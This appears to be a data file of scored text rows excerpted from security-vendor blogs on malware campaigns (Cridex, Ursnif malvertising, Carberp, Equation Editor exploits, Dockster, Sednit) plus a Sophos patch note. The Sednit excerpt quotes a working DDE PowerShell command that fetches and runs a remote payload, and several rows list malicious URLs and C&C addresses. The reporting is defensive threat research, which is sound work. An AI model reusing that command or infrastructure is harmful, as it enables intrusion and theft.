Malicious iFrame URL found in the attachment:  hxxp://dporooppasoodajhsjs.ru:8080/images/aublbzdni.php
Upon downloading and viewing the malicious attachment, an iFrame tag attempts to load, ultimately serving client-side exploits such as the Libtiff integer overflow in Adobe Reader and Acrobat (CVE-2010-0188), and  Trusted method chaining remote code execution (CVE-2010-0840).
The malicious file attachment is currently detected as JS/Agent.PX.gen; JS/Kryptik.SA!tr; Mal/Iframe-AE, MD5: e1f40f7ca35b35692c4762ed26cc1a61 – by 4 out of 43 antivirus scanners.
Upon successful client-side exploitation, the campaign drops MD5: 972c89c5114fae66595e5d3e3817e746 – detected by 32 out of 42 antivirus scanners as Worm:Win32/Cridex.B from hxxp://xsopiisvvajushgd.ru:8080/images/jw.php?i=8.
It then phones back to hxxp://usepaxvulfdtnwiwwk.ru:8080/rwx/B1_3n9/in/ (178.162.154.214) and hxxp://nolwzyzsqkhjkqhomc.ru:8080/rwx/B1_3n9/in/ (88.190.22.72).
What’s particularly interesting about this campaign is that the malicious iFrame is hosted within a fast-flux botnet, and is therefore currently responding to multiple IPs, in an attempt by cybercriminals to make it harder for security researchers to take it down.
End users are advised to ensure that they’re not running outdated versions of their third-party software and browser plugins, as well as to avoid interacting with the malicious emails.
Webroot’s security researchers will continue monitoring the campaign, to ensure that Webroot SecureAnywhere customers are protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.009006863246016183
Stop the madness,0.01058457793384271
"Posted by Roger on 22 July 2004, 9:06 am",0.012227415615259973
"Over the years it has become more and more difficult to keep up with the virus naming schemes of various vendors. Blaster, Welchia, Wachovia, oh wait not that last one. And then you have the varient names. One company’s aa varient is another company’s ai and another’s ah. Its tough to keep track. You hear about a new virus alert and you just dont know if you’ve already got that one covered or not.
If you use one AV product enterprise wide, this probably isn’t much of a problem for you until you try to converse about a virus with someone an acolyte of another antivirus product. However, if you’re like me you have multiple antivirus companies at the various layers of your company. You even have multiple av engines in a single product like Sybari Antigen or Message Labs. This is where the nightmare starts.
Even over at secunia.com which appears to be trying to be a repository of this information they dont get it right. I go over there to see what’s up with bagle.ai and they have it as being discovered today by Panda. What about yesterday with McAfee and Trend?
Has CVE really helped in the area of vulnerability tracking? I dont know. The Common Vulnerability and Exposures Datebase started by the Mitre Corporation keeps a list of standardized names and a vulnerability number for vulnerabilities. I think that’s kind of database via third party we should have for virus naming schemes. However since many viruses are flash in the pan type events, we need these names fast. Some have suggested using a preordained naming scheme link they do with hurricanes. That still would not solve the varient problem.
I dont know what the ultimate solution is. I just wish someone would stop the madness.
",0.013745381480091412
Popular Indonesian Tech News Site Serves up a Side of Malware,0.010630059481128606
"<p>
Raytheon | Websense&reg;&nbsp;Security Labs&trade; researchers have identified a recent malvertising campaign affecting a&nbsp;popular Indonesian technology news site, Tabloid Pulsa. Users browsing to this site are being redirected to an exploit kit and served up malware, due to a compromised advertising script that is being used by the site.</p>
<p>
Raytheon | Websense customers&nbsp;are protected against this threat via real-time&nbsp;analytics with ACE,&nbsp;the Websense&nbsp;<a href=""http://www.websense.com/content/websense-advanced-classification-engine.... rel=""nofollow"" target=""_blank"">Advanced Classification Engine</a>.</p>
<h2>
Compromised Website</h2>
<p>
The compromised website in question is&nbsp;<em>tabloidpulsa[.]co[.]id</em>, a popular Indonesian site that has close to 1 million hits per month according to&nbsp;<a href=""http://www.similarweb.com/website/tabloidpulsa.co.id#overview"" target=""_blank"">SimilarWeb</a>. The website is using a Revive Adserver script which has been compromised, and this is not the first time we&#39;ve&nbsp;<a href=""http://blogs.websense.com/security-labs/large-malvertising-campaign-lead... target=""_blank"">seen these scripts compromised</a>. The script has been modified to insert an iFrame that leads to another malicious site, which then redirects to Nuclear Exploit Kit.</p>
<p>
<img alt="""" src=""/sites/default/files/blog/legacy/security-labs/5417.tabloidpulsa_similarweb.png-550x0.png"" style=""height:326px; width:550px"" /></p>
<p>
The compromised advertising script is hosted on a third-party website,&nbsp;<em>ox[.]indomediagroup[.]com</em>&nbsp;and is used by at least 2 other popular Indonesian sites, meaning that users browsing to those sites may also be affected.</p>
<p>
Here is the full infection chain:</p>
<p>
<em>tabloidpulsa[.]co[.]id--&gt; ox[.]indomediagroup[.]com/www/delivery/afr.php?zoneid=83&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;ct0=INSERT_CLICKURL_HERE</em>&nbsp;-&nbsp;<strong>Compromised Revive Ad Server script</strong><em>--&gt; rectangle[.]radionasarijecchicago[.]com/fxxnem4.html</em><strong><em>&nbsp;</em>- Malicious redirect</strong><em>--&gt; hofawubv[.]mine[.]nu/forum/index.php?showtopic=420</em>&nbsp;-&nbsp;<strong>Nuclear Exploit Kit</strong></p>
<h2>
Malware Payload</h2>
<p>
When we analyzed the infection chain for this attack on&nbsp;November 3, Nuclear Exploit Kit decided to exploit our outdated version of Adobe Flash Player with vulnerability CVE-2015-5122 (<a href=""https://www.virustotal.com/en/file/09c2e2d19d56f87c5b5342d95422e12d929f9... target=""_blank"">VirusTotal</a>), and then dropped what seems to be a new variant of the Ursnif malware:</p>
<p>
<a href=""https://www.virustotal.com/en/file/514b0d82faa73cee71e7b9323411f496be435... target=""_blank"">https://www.virustotal.com/en/file/514b0d82faa73cee71e7b9323411f496be435...
<p>
This Ursnif variant uses the following command and controls (C&amp;C) over HTTP:</p>
<p>
<em>rastobona[.]comartefaki[.]comspamhausanilingus[.]rugazivitaton[.]ru</em></p>
<p>
And the following C&amp;C over UDP port 9772:</p>
<p>
<em>95[.]215[.]110[.]147</em></p>
<p>
Ursnif is capable of intercepting, modifying, and exfiltrating traffic from browsers such as Internet Explorer, Chrome, and FireFox, as well as providing a general purpose backdoor into the user&#39;s system.</p>
<h2>
Summary</h2>
<p>
Malvertising remains as popular as ever when it comes to a cybercriminal&#39;s weapon of choice for web-based exploits, and compromising advertising scripts can open up a large surface area of potential victims. It is important for a business to consider which third-party scripts they decide to use, in order to minimize their security risk. Raytheon | Websense will continue to monitor this malvertising campaign and associated malware.</p>
",0.015418876510527646
UTM Up2Date 9.307 Released,0.00861687136921252
"Written by
Eric Bégoc",0.010229904213713614
"February 02, 2015",0.009147129414465605
Network up2date UTM UTM 9,0.01007005226623292
"Today’s Up2Date package for Sophos UTM 9.3 will introduce  several fixes to our current UTM platform, including an update for glibc to fix potential vulnerability (GHOST, CVE-2015-0235).
For details on installation options and latest additions in this package please read on.",0.015906800232158957
"UTM 9.307006
News",0.00834398792792479
"Security Update
Update glibc to fix potential vulnerability (GHOST, CVE-2015-0235)",0.010956622532577232
Remarks,0.009780636038266843
"System will be rebooted
Configuration will be upgraded
Connected Wifi APs will perform firmware upgrade",0.008729859254918315
Bugfixes,0.009816324567177737
"32724 improvements for the rpmdb check
33841 Mesh APs keep rebooting
33936 prevent “ulogd: ct1: nl_recvmsgs: Try again” error message in system.log
34164 [NUTM-424] frequent notifications about corrupted RPM Database
34347 glibc vulnerability (GHOST, CVE-2015-0235) [9.3]",0.009549671780404112
"Up2date link:
ftp://ftp.astaro.de/UTM/v9/up2date/u2d-sys-9.306006-307006.tgz.gpg",0.010280046556050748
"Up2date MD5sum:
5faeec001814274f0081bde652361044",0.009007051431775492
"File size:
~36MB",0.007951259522038456
"Up2Date Installation:
Sophos Up2Date technology makes it easy to upgrade your Sophos UTM to the latest version.
There are two ways to apply an already-downloaded Up2Date package to the system:",0.013772033919475235
"Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on the “Watch Up2Date Progress in new window” and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:",0.011976908437992817
"If you want to provide feedback or want to discuss any of the UTM V9 features you should post it on our User Bulletin Board. Please indicate the version you are using to help us (and everyone helping you).
Feedback",0.013947982400573822
"If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.
You are free to use our new demo server environment without hassle, nags, or registration. Enjoy!",0.01571937477116958
"Eric Bégoc
Senior Product Manager",0.010102162674290538
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"All Carberp botnet organizers arrested
Carberp is a unique case, with all the guys who organized really big botnets and made big profits (millions of US dollars) being arrested.",0.024296086246891946
2 Jul 2012 - 09:12AM,0.011371270555192936
"Carberp is a unique case, with all the guys who organized really big botnets and made big profits (millions of US dollars) being arrested.",0.020565308475179234
"We have been tracking the Carberp cybercrime group’s activity for three years now. Tracking started in 2009 with the first samples of the Carberp malcious software seen in the wild. By the beginning of 2010 the second wave of Carberp activity had forced out other banking malware families (Win32/Spy.Shiz, Win32/Hodprot) in Russia. We summarized the first phase of our investigation in our presentation “Cybercrime in Russia: Trends and issues” at CARO in 2011. This year we summarized the results of our further investigations in the presentation “Carberp Evolution and BlackHole: Investigation Beyond the Event Horizon” at CARO 2012.",0.019146188153016164
Over the whole period three different cybercrime groups worked with Carberp. The first group started in 2009 and the organizer of this group had a direct relationship with Carberp’s main developer. This group first started using legitimate software for remote control so as to steal money manually when an infected machine is active (Sheldor-Shocked). In 2010 Carberp sources were sold to the organizer of the second group and they worked in parallel.,0.020277238440817524
At the beginning of summer 2011 the biggest Carberp botnet of all time was started by the organizers of the Hodprot botnet (Hodprot: Hot to Bot). The end of October 2011 saw the first detections of a variant of the Carberp dropper with a bootkit on board (Evolution of Win32/Carberp: going deeper). This botnet has the codename “Origami” and its administration panel looks like this:,0.024769370650889244
"This group used targeted plugins for attacking major banking systems in Russia and performed experiments with phishing on popular social networks (Facebook Fakebook: New Trends in Carberp Activity). At the end of 2011 a campaign started with mass infection of legitimate sites with BlackHole redirections (Carberp + BlackHole = growing fraud incidents, Blackhole, CVE-2012-0507 and Carberp). In April 2012 BlackHole gave way to the latest version of Nuclear Pack using a smart redirection technique (Exploit Kit plays with smart redirection).",0.02639156921705077
Over the whole period the first group used Win32/Sheldor for stealing money manually and in 2011 Sheldor has evolved to Win32/RDPdoor (based on the legitimate ThinSoft BeTwin software). The latest version of Win32/RDPdoor has smartcard detection functionality and for transparent remote exploitation of smartcards it can install FabulaTech USB for Remote Desktop (Smartcard vulnerabilities in modern banking malware). The administration panel for the latest version of Win32/RDPdoor looks like this:,0.014867927570168082
Now the organizers of all three groups have been arrested in Russia. News of the first arrest was released in March 2012 (Members of the largest criminal group engaged in online banking fraud are detained). One of the organizers of the second group was arrested at the beginning of June 2012 (Group-IB aided Russian law enforcement agents in arresting yet another cybercriminal group). And at the end of June the organizer of the botnet “Origami/Hodprot” was arrested (One of the largest banking botnets has been disabled).,0.025259087850180606
The statistics for Win32/RDPdoor detections look like this:,0.008844833299775923
[Cloud data from Live Grid],0.010214473280007574
Statistics for Carberp detections look like this:,0.009619661526119594
[Cloud data from Live Grid],0.010214473280007574
Carberp detection statistics by region:,0.010065448293146706
[Cloud data from Live Grid],0.010214473280007574
"All the Carberp botnet organizers have been arrested, but our statistics aren’t showing a big drop in detections. The Russian region leads as before for Carberp detections and after the arrests it showed a brief dip. On the timeline detections graph we can see the downturn in detections after every arrest, as with the June detection statistics. But at the end of June an organizer of the biggest Carberp botnet “Origami/Hodprot”  (with millions of bots active at any one time) was arrested. It’s a unique case, with all the guys who organized really big botnets and made big profits (millions of US dollars) being arrested.",0.018843539120702912
"Special thanks to my colleagues from Group-IB, Dmitry Volkov and Ilya Sachkov, who undertook the largest part of the investigation into the Carberp case.",0.016238409544700017
"Aleksandr Matrosov, Security Intelligence Team Lead
",0.010083666225937482
"A new Equation Editor exploit goes commercial, as maldoc attacks using it spike",0.008074127356753724
"Weaponized RTF documents adopt CVE-2018-0798, another Equation Editor vulnerability",0.008033555659258562
"Written by
Gabor Szappanos",0.010394306867931857
"July 18, 2019",0.008766367160860211
SophosLabs Uncut Threat Research .doc CVE-2018-0798 Equation Editor Exploit maldoc Microsoft Office Microsoft Word PDF RTF,0.011018981893267665
"There is a distinct point of maturation in the life cycle of an Office exploit: the point where it becomes generally available for the crimeware groups. Before that point the exploit has affected only a few selected victims of targeted attacks. From that point on it becomes widespread and threatens the general user population.
CVE-2018-0798, yet another Equation Editor vulnerability, reached this point of maturation around the end of June 2019.
How the exploit works
This exploit was used in targeted attacks we observed over the past several months, staying mostly under the radar. A detailed description of the vulnerability and its usage in targeted attacks, published earlier this month, explains the fundamentals.
At some point, someone appears to have integrated the exploit implementation that was used in the targeted attacks into a malicious Office document builder tool, with only minor changes. This sets the stage for much broader adoption of the attack technique.
The similarities are unmistakable: For example, the exploit trigger is exactly the same, and the shellcode (responsible for decrypting and executing the payload) is nearly identical to the shellcode used in the targeted attacks. Although CVE-2018-0798 is a relatively simple buffer overflow vulnerability, there are a few factors that make it difficult to tweak the exploit trigger itself, hence the virtually identical implementation.
The attack uses Equation Editor to put the malicious buffer through several transformations, and during processing the memory layout will be rather different from the file layout, which complicates analysis (and tweaking). Moreover, the attacker only controls the lower word of the return address on the stack. These complications make it less likely that the crimeware implementations will significantly change the exploit trigger.
The weaponized RTF files that are part of this campaign have a curious characteristic: some junk content near the header — content that fits a pattern normally seen in PDF files. It seems like the presence of this PDF header data content might be an attempt to confuse document filetype parsers in AV scanners.
Malicous RTF file with PDF fragments
An interesting feature in the shellcode is that the Windows API functions are not called from the shellcode itself. Instead, the clearerr function from the msvcrt.dll is patched with a short code that invokes the desired API function.
The original code of clearerr looks like this:
clearerr before the patch
This is replaced with a code that first checks if the API function was already hooked by a security software (the presence of 0xE9 and 0xEB indicate that the original entry of the API handler was patched, redirected to a monitoring function). If patching is detected, the shellcode will skip the first 5 bytes, the redirector, and jumps directly into the body of the function, done by the JMP EAX instruction.
clearerr after the patch
The result of this trick is that all of the Windows API calls that the shellcode uses will appear to be initiated from msvcrt.dll, which makes it a much less suspicious activity for behavior monitoring software.
The only significant change in the crimeware cases is the extracted payload. The APT samples were self-contained, the final payload was stored in the RTF file. On the other hand, in the crimeware samples the payload is a very simple downloader trojan, that fetches the final payload from a hardcoded URL.
In both cases the RTF file contains an embedded payload. There were a few different implementations in the APT cases. In the most simple of them, the payload is embedded into the RTF file without any encryption, as illustrated in the following picture where the MZ marker of the embedded executable is clearly visible in the RTF content.
Embedded executable payload’s characteristic MZ header is clearly visible in RTF
In the typical cases a one-byte XOR algorithm is used where the encryption key changes for each data byte. This makes it more difficult to recognize the embedded content which at first looks like some random data.
Embedded encrypted content in RTF
The crimeware builder chose a bogus (yet more convenient) implementation of the latter, more details in the next section.
The downloader component
The CVE-2018-0798 exploit triggers the shellcode that decrypts the payload (one-byte XOR algorithm, the key is 0xFC) and executes it. More precisely, the encryption algorithm is supposed to be a running key byte-wise XOR algorithm, but the APT sample that was used as a template for the crimeware builder used a bogus implementation of this algorithm.
Instead of key changing for each file position, the key changes only for the first 4 bytes, for the rest of the file it will be 0xFC. The following picture shows large blocks of 0xFC bytes in the embedded payload, which clearly reveals the encryption key.
The encrypted downloader with the URL in it
It should not be a coincidence that the crimeware builder chose this implementation. It is much easier to patch only the hardcoded encoded URL in the RTF file with fixed key, than to recode the embedded EXE and rebuild the RTF file for every sample.
The program downloads the hardcoded URL, saves it to the %APPDATA% folder, then executes it.",0.025404510119874102
"The critical Windows API function names are slightly obfuscated, the first character of the name is changed.
The same downloader executable is present in all recent crimeware sample; Only the hardcoded download URL changes. This is a good choice for the easy development of the builder.
What the malicious spam messages look like
We’ve observed several email distribution campaigns using these weaponized Office documents. The identified payload of the infection campaigns were all the “usual suspect” crimeware family payloads: Fareit, Lokibot, Formbook, or AzoruLT. The most widely distributed payload is Fareit.
We have observed that the spam campaigns use a wide selection of social engineering tropes.
Cargo arrival notice themed messages:",0.011123217209221936
Fedex tracking was particularly popular:,0.007302865399942182
And of course the order confirmation spam:,0.00832022665287413
Lokibot was distributed using a “payment advice”-themed message:,0.008289509658690575
And in messages that purported to contain a product inquiry:,0.008481941874828203
"The “give us your best price quote” email was used to distribute Formbook:
The vulnerability affects all Equation Editor versions (even the ones that were patched for CVE-2017-11882).
The patch for the CVE-2018-0802 exploit permanently “fixes” the vulnerability by eliminating the Equation Editor altogether.
Since the end of June, we’ve started to observe an increase in the use of this vulnerability in phishing campaigns. Since that time, we’ve observed about 200 new malicious RTF documents using this exploit. These documents are very similar to each other. This, and the large number of samples indicated that a builder tool that generates the weaponized .doc files probably is in circulation. We can expect the use of this exploit to rise, at least for the near future.
We have the following detections that provide generic coverage for the known samples:
Exp/20180798-A
Troj/RtfExp-FB
Troj/RtfExp-EY
Indicators of Compromise
File hashes for the samples analyzed in this report are on the SophosLabs Github.",0.013651352740323808
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Spying on Tibetan sympathisers and activists: Double Dockster*
Does the expression 'In the Wild' still mean anything today? Well yes, in the sense of something that is 'out there' threatening real-world systems. But things move a lot faster these days than they did in the 90s and later, fastburning mass-mailers notwithstanding. Just a few days ago (on the 30th of November, to be",0.018191100516884662
4 Dec 2012 - 03:58AM,0.011373689082710414
"Does the expression 'In the Wild' still mean anything today? Well yes, in the sense of something that is 'out there' threatening real-world systems. But things move a lot faster these days than they did in the 90s and later, fastburning mass-mailers notwithstanding. Just a few days ago (on the 30th of November, to be",0.016168023645665164
"Does the expression 'In the Wild' still mean anything today? Well yes, in the sense of something that is 'out there' threatening real-world systems. But things move a lot faster these days than they did in the 90s and later, fastburning mass-mailers notwithstanding.",0.016252141163618394
"Just a few days ago (on the 30th of November, to be precise) Intego – quite rightly – flagged the OS X spyware it calls OSX/Dockster.A as low-risk, because it had been found on Virus Total but wasn't known to be in the wild. As of yesterday, the thing had gone decidedly feral, though in a context that ensures that relatively few readers of this blog will see it. Intego may have been right in thinking that the binary found on Virus Total was some kind of test before letting it out into the wild. Acting on a tip-off, F-Secure found it lurking on a web site associated with the Dalai Lama. In fact, Hxxp://gyalwarinpoche.com (I don't want you accessing it accidentally as I don't know the protection status of your machine!) is the Dalai Lama’s Tibetan language site, set up in 2010. According to Sophos (which calls the malware OSX/Bckdr-RNW), the site was compromised (again) back in October, and right now it's serving the Java-based exploit CVE-2012-0507 (also used by Sabpab and Flashback) to push the Dockster malware.",0.012336229747091143
"This relatively simple backdoor trojan, found on Virus Total, provides a remote shell to give a remote attacker access to the system, provides a channel for downloading additional files, and has keylogger functionality. Presumably, it's another attempt to monitor and/or attack people who follow or sympathise with the exiled Dalai Lama. As remarked elsewhere, it's not only an effective way of gaining access to those followers with unprotected machines, but by compromising a system associated with a trusted religious leader, they also do harm to his cause, and it would be naive not to suspect that was part of the motive.",0.010889923759256237
"Fortunately, whatever you may have heard to the contrary, anti-virus is not dead and does not only detect known viruses: AV companies have detected the Java exploits for some time, and the malware sample cited by F-Secure as OSX/Dockster.A has been detected by ESET since October 16th as OSX/Agent.AB.",0.01494004515411329
*Totally irrelevant pun: punster tips hat to Jeff Lindsay,0.010411339246450657
[Tenuously connected Yosemite coyote photo detail by Small Blue-Green World],0.008916324571806467
"David Harley CITP FBCS CISSP
ESET Senior Research Fellow
",0.011179100245160778
"Sednit update: How Fancy Bear Spent the Year
Over the past few years the Sednit group has used various techniques to deploy their various components on targets computers. The attack usually starts with an email containing either a malicious link or malicious attachment.",0.014664010000510541
ESET Research,0.009387999064506491
21 Dec 2017 - 02:58PM,0.011602984205234979
Over the past few years the Sednit group has used various techniques to deploy their various components on targets computers. The attack usually starts with an email containing either a malicious link or malicious attachment.,0.014180457526135504
"The Sednit group — also known as Strontium, APT28, Fancy Bear or Sofacy — is a group of attackers operating since 2004, if not earlier, and whose main objective is to steal confidential information from specific targets.",0.01781170417032807
"This article is a follow-up to ESET’s presentation at BlueHat in November 2017. Late in 2016 we published a white paper covering Sednit activity between 2014 and 2016. Since then, we have continued to actively track Sednit’s operations, and today we are publishing a brief overview of what our tracking uncovered in terms of the group’s activities and updates to their toolset. The first section covers the update of their attack methodology: namely, the ways in which this group tries to compromise their targets systems. The second section covers the evolution of their tools, with a particular emphasis on a detailed analysis of a new version of their flagship malware: Xagent.",0.015860640178760876
The Campaigns,0.009574266277503574
"Over the past few years the Sednit group has used various techniques to deploy their various components on targets computers. The attack usually starts with an email containing either a malicious link or malicious attachment. We have seen a shift in the methods they use ‘in the course of the year’, though. Sedkit was their preferred attack vector in the past, but that exploit kit has completely disappeared since late 2016. The DealersChoice exploit platform has been their preferred method since the publication of our white paper, but we saw other methods being used by this group, such as macros or the use of Microsoft Word Dynamic Data Exchange.",0.01500510516825948
"The following three sections will describe the different methods used by Sednit’s operator to gain an initial foothold on a target system. Generally, these campaigns will try to install Seduploader on the target system. Seduploader is a first stage backdoor that can be used to assess the target’s importance and download additional malware. If the system is indeed of interest to them, it is likely that Sednit’s operators will eventually install Xagent on it.",0.016649075553227033
Sedkit (Sednit Exploit Kit),0.01721135066649604
"Sedkit was an exploit kit used exclusively by the Sednit group. During its lifetime, Sednit leveraged vulnerabilities in various persistently vulnerable applications, but mostly Adobe Flash and Internet Explorer. When Sedkit was first discovered, potential victims were redirected to its landing page through a watering-hole scheme. Following that campaign, their preferred method consisted of malicious links embedded in emails sent to Sednit’s targets. Sedkit’s workflow is illustrated below.",0.016677446216591285
"Between August and September 2016, we saw several different email campaigns trying to lure the recipients of their messages to a Sedkit landing page. Sedkit’s targets at that time were mostly embassies, and political parties in Central Europe. The next figure shows an email containing such a URL.",0.0183607272753179
"The email tries to fool its recipient into believing that the link will ultimately lead to an interesting news story. In this case, the article is supposedly about an earthquake that struck near Rome in August 2016. While the email impersonates someone the victim would consider trustworthy, there are two major hints that could lead an attentive recipient to conclude that this email is fake. The first one is that there are spelling mistakes (e.g. “Greetigs!”). Spelling mistakes are common in malicious Sednit mails. The second one is the URL’s domain part. It is a purely malicious domain, but the path part of the URL actually mimics a real, legitimate link. In this particular case, the URL path is the same as one used in a BBC story about this earthquake. Again, this is a commonly-used Sednit tactic, using popular stories found on legitimate news websites and redirecting targets that click on the emailed URL to the real website, but not before visiting the Sedkit landing page. Besides the BBC, The Huffington Post is another popular media outlet whose stories they like to use as bait.",0.01782371260212323
"The email shown below, where the link redirects to Sedkit, exhibits several interesting features.",0.01459199562296598
"Firstly, the email’s subject and URL path are not aligned: the former refers to Syria and Aleppo while the latter refers to WADA and Russian hacking. Secondly, there are two glaring spelling mistakes. The first one, is again the use of “Greetigs!” and the second one is “Unated Nations”. Hopefully, someone working for the United Nations’ public relations department would not have such a glaring error in their email signature block.",0.011279184034962308
"The last campaign using Sedkit was observed in October 2016. It is interesting to note that the disappearance of Sedkit follows a trend we have seen with other exploit kits. Most of these were relying exploits for older versions of Internet Explorer and/or Flash to perform drive-by downloads. The decline of the majority of exploit kit operations during 2016, including Sednit, could well be attributable to the code hardening performed by Microsoft and Adobe.",0.01746463348169569
Full details of Sedkit’s inner workings can be found in our previously published white paper.,0.01726710162644962
DealersChoice,0.009381156739031393
"In August 2016, Palo Alto Networks blogged about a new platform used by Sednit to breach a system initially. This platform, which they called DealersChoice, has the ability to generate malicious documents with embedded Adobe Flash Player exploits. There are two variants of this platform. The first one checks which Flash Player version is installed on the system and then selects one of three different vulnerabilities. The second variant will first contact a C&C server which will deliver the selected exploit and the final malicious payload. Of course, the second version is much harder to analyze, as the document delivered to the targets does not contain all the pieces of the puzzle.",0.011731019692661993
"This platform is still in use today by Sednit and, like Sedkit, tracks international news stories and includes a reference to them in their malicious emails, in an attempt to lure the target into opening the malicious document attachment. Sometimes, they also use other, non-political, schemes. In December 2016, they used a rather unusual (for the group) lure:",0.013794559612173463
"This email was sent to multiple Ministries of Foreign Affairs and embassies in Europe on December 22nd and 23rd, and contained a Word document attachment that appeared to be a Christmas eCard. Note that this was the first time that we saw the Sednit group use a non-geopolitical phishing gambit attempting to trap their targets. Of course, the Word document, if opened, uses DealersChoice to try to compromise the system. Sednit used DealersChoice intensively in late 2016, but the platform was not seen for a long time after that. In fact, the first time we saw them use it in 2017 was in October.",0.014936206120804263
"We do not have the email used for this particular campaign, but, based on the decoy document, we can assume that government agency employees were the targets. Other campaigns using DealersChoice were the subject of different blogs published by security researchers. One noteworthy example is the one by Proofpoint where they detail the addition of a new Adobe Flash Player vulnerability to the DealersChoice platform. This indicates that this platform is still in use by this group and under constant development.",0.012775225154589509
"Macros, VBA and DDE",0.00855421888458574
"Besides Sedkit and DealersChoice, Sednit’s operators also continued using proven ways to compromise systems they target by relying on macros in a Microsoft Office documents, but also used other methods. One campaign that grabbed a lot of attention targeted an Eastern European MFA in April 2017. The following email was sent to an MFA employee:",0.012526447493793391
The attachment contained code exploiting two zero-days: one local privilege escalation (LPE) and one remote code execution (RCE). These two zero-days were reported by ESET to Microsoft. A detailed analysis of this campaign can be found on our blog.,0.011891852858334606
"The final case highlighted here illustrates how Sednit’s operators pay close attention to new technical developments in security. In the beginning of October 2017, SensePost researchers wrote an article on a Microsoft Word methods called the Dynamic Data Exchange (DDE) protocol. DDE is a way to exchange data between applications. For example, it allows a Word table to be updated with the data contained in an Excel document. It is convenient, but in the case of at least Word and Excel it can also be used to execute arbitrary code, if the user ignores several warning prompts. Following the publication of that article, it did not take long to discover Sednit campaigns using DDE to execute code from a C&C server. In these campaigns, documented by McAfee, the decoy document is empty, but it contains a hidden field containing the following code:",0.010911408069975925
DDE,0.0070352552015477965
"""C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://sendmevideo.org/dh2025e/eee.txt');powershell -enc $e # "" ""a slow internet connection"" ""try again later""",0.0120588237551289
1,0.011966970221767848
"""C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://sendmevideo.org/dh2025e/eee.txt');powershell -enc $e # "" ""a slow internet connection"" ""try again later""",0.0120588237551289
"If the intended potential victim opens the document and makes the foolhardy chose to ignore the warnings, the above script is executed and the Seduploader binary is downloaded from the C&C server and executed on the target’s system.",0.010687444843329397
"This is only a brief overview of how the Sednit operators have been trying to compromise new victims since the publication of our white paper. As you can see, they are just as active as they were and are still actively targeting governments worldwide.",0.01231967779172305
Tooling,0.008313259412483287
"The previous section shows how the Sednit group spent the last year from the infection-vector point of view. This section describes changes that this group made to their toolset. In 2016, ESET released a deep analysis of each component; it is available here.",0.014061322679806865
"Over the years the group developed a lot of components to infect, gather and steal information from their targets. Some of these components have disappeared since, while others have been improved.",0.014884616552873209
Seduploader,0.007115364272696323
"Seduploader serves as reconnaissance malware. It is made up of two distinct components: a dropper, and the persistent payload installed by this dropper. Seduploader is still used by the Sednit group but it has received a few improvements. During the April 2017 campaign a new version of Seduploader came out with some new features, such as a screenshot function or the ability to directly execute loaded into memory from the C&C server. Recently, we have seen the Seduploader dropper replaced by PowerShell commands delivering the Seduploader payload.",0.014348376603985913
Xtunnel,0.007891201319471852
Xtunnel is a network proxy tool that can relay any kind of network trace between a C&C server on the Internet and an endpoint computer inside a local network. Xtunnel is still used by the Sednit group.,0.012240276417876728
Sedkit,0.008211681342208177
"Sedkit is the Sednit exploit-kit; it’s used only for targeted attacks, starting with targeted phishing emails with URLs that spoof legitimate URLs. October 2016 is the last time we’re aware that Sedkit was used.",0.016890500839396805
Sedreco,0.008665305226952746
Sedreco serves as a spying backdoor; its functionalities can be extended with dynamically loaded plugins. It is made up of two distinct components: a dropper and the persistent payload installed by this dropper. We have not seen this component since April 2016.,0.010993186138292366
USBStealer,0.008410087068618344
USBStealer serves as a network tool that extracts sensitive information from air-gapped networks. We have not seen this component since mid 2015.,0.011986488190926958
Xagent,0.007737166156282171
"Xagent is a modular backdoor with spying functionalities such as keystroke logging and file exfiltration. Xagent is the group’s flagship backdoor and heavily used in their operations. Early versions for Linux and Windows were seen years ago, then in 2015 an iOS version came out. One year later, an Android version was discovered and finally, in the beginning of 2017, an Xagent sample for OS X was described.",0.012366358241970299
"We saw a new version of the Windows version of Xagent last February. Because of the following strings found in the binaries, we deduced that it was version 4 of the backdoor. The different versions of Xagent’s modules are listed in Table 1.",0.00977563119450009
Table 1. Xagent versioning,0.00814506991309405
module/channelv3 uidv4 uid,0.010588883993290277
AgentKernel33034401,0.007997993431112627
WinHttp21114402,0.009614945656429508
ModuleFileSystem21034411,0.008265724036758071
ModuleRemoteKeyLogger21074412,0.00868607975971758
ProcessRetranslatorModule21064413,0.00926743824575349
Unknown [1]??4414,0.011787214613036778
Version 4 of Xagent came with new techniques for strings obfuscation and all Run-time type information (RTTI) are obfuscated as well. These techniques significantly improve the way in which strings are encrypted with a method unique to each binary. Previous versions of Xagent used an XOR loop to decrypt strings. The new encryption algorithm is a series of operations with values probably generated at the compile time. The following figure illustrates the complexity of the code.,0.015790331465668106
"However, the HexRays decompiler does a decent job of simplifying it. Here is an example:",0.01147188918082942
C,0.008767547862344682
return (((((a2 ^ (((((((((((a1 - 13 + 42) ^ 0x7B) + 104) ^ 0x72) - 81 - a2 - 76) ^ 0x31) + 75) ^ 0x3B) + 3) ^ 0x40) + 100) ^ 0x1C ^ 0xA9) + 41) ^ 0xB9) - 65) ^ 0xA) % 256;,0.015465705425361076
1,0.011966970221767848
return (((((a2 ^ (((((((((((a1 - 13 + 42) ^ 0x7B) + 104) ^ 0x72) - 81 - a2 - 76) ^ 0x31) + 75) ^ 0x3B) + 3) ^ 0x40) + 100) ^ 0x1C ^ 0xA9) + 41) ^ 0xB9) - 65) ^ 0xA) % 256;,0.015465705425361076
